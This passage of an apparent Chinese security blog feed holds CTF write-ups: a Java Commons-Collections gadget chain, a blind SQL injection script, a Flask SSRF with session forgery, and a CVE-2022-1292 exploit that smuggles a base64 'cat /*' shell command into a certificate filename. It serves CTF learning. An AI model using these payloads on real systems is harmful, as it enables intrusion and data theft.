class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4是在CC3的基础上, 前半段不动, 在调用ChainedTransformer的transform方法上有所不同</p><p> 之前的CC1,CC6都是从<code>LazyMap</code>或<code>TransformedMap</code>的get方法去调用transform, 这里CC4使用了其他的链子</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC1&quot;&gt;&lt;a href=&quot;#CC1&quot; class=&quot;headerlink&quot; title=&quot;CC1&quot;&gt;&lt;/a&gt;CC1&lt;/h1&gt;&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CC链" scheme="http://example.com/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>一些题目</title>
    <link href="http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <id>http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</id>
    <published>2024-03-12T15:53:55.000Z</published>
    <updated>2024-03-15T07:54:18.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>比较简单的bool注入,过滤了空格和&#x2F;**&#x2F;</p><p>这里无表名列名, 之前的无表名列名的注入手法都没成功</p><p>没想到猜了一手flag表flag列就出了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_of_true = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://2b63de0f-491e-44ef-b06a-923f11aee2a8.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">sql = <span class="string">&quot;(select(flag)from(flag))&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(&quot;</span> + sql +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312234910906.png" alt="image-20240312234910906"></p><p>比较坑的点是sql语句必须要括号包裹</p><h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的一题, 之前做过类似的</p><p>读MAC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read?url=local_file:///sys/class/net/eth0/address</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28201</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753; session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtOXZkQT09In1mUS5l7zFyQS64asbFTzEdi+wVkx5S0Cc4YzZOYVk=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:de:d1</span><br><span class="line">0242ac02ded1</span><br></pre></td></tr></table></figure><p>python2下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02ded1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"><span class="comment">#输出 175.043938323</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013527918.png" alt="image-20240312013527918"></p><p>flask session伪造</p><p>读取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013549292.png" alt="image-20240312013549292"></p><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p>题目被标记了CVE-2022-1292, 直接开搜</p><p><a href="https://xz.aliyun.com/t/11703">https://xz.aliyun.com/t/11703</a></p><p>利用也非常的简单, 在crt证书的文件名中包含反引号包裹的shell命令, 之后使用c_rehash创建符号链接时, 包裹的命令就会被执行</p><p>题目给出了附件, 先看flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里有三条路由:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/getcrt : 创建一个crt证书, 并回显文件名</span><br><span class="line">/createlink : 使用c_rehash命令为创建的证书建立符号链接,  这里也就上面提到的cve命令关联了</span><br><span class="line">/proxy : 向服务器本地的8887端口发送get请求, 这里很容易看出来是有CRLF响应拆分漏洞</span><br></pre></td></tr></table></figure><p>关于响应拆分</p><p><a href="https://xz.aliyun.com/t/9707">https://xz.aliyun.com/t/9707</a></p><p>再看服务器本地运行的go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>) </span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易发现&#x2F;admin&#x2F;rename这条路由是更改我们创建的证书文件的文件名</p><p>与上面python的&#x2F;createlink路由的功能相结合就造成了CVE-2022-1292的利用点</p><p>首先创建一个证书并拿来文件名</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312155735785.png" alt="image-20240312155735785"></p><p>之后ssrf加响应拆分改文件名, 这里会踩坑,admin后的<code>/</code>必须url编码, 必须用form-data发包, 不然没有<code>\r\n</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180041150.png" alt="image-20240312180041150"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=7463b49b-69c6-49f5-8f3d-0d0f97161381.crt&amp;newname=`echo$&#123;IFS&#125;1$&#123;IFS&#125;&gt;a`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180125110.png" alt="image-20240312180125110"></p><p>可以发现成功写入</p><p>但是这里文件名不能包含<code>/</code>, 稍微绕过一下</p><p>这里试了很多次base64来绕过但是没有成功</p><p>之后是尝试${PATH:0:1}来绕过, 也没成功,</p><p>有说用${OLDPWD}的, 这个变量是表示当前目录,这里也不是<code>/</code></p><p>最后还是base64绕过, base64的内容是cat &#x2F;*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=07fc2723-258b-4873-9011-e2df6a4041e6.crt&amp;newname=`echo$&#123;IFS&#125;Y2F0IC8qIA==|base64$&#123;IFS&#125;--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312223845842.png" alt="image-20240312223845842"></p><h2 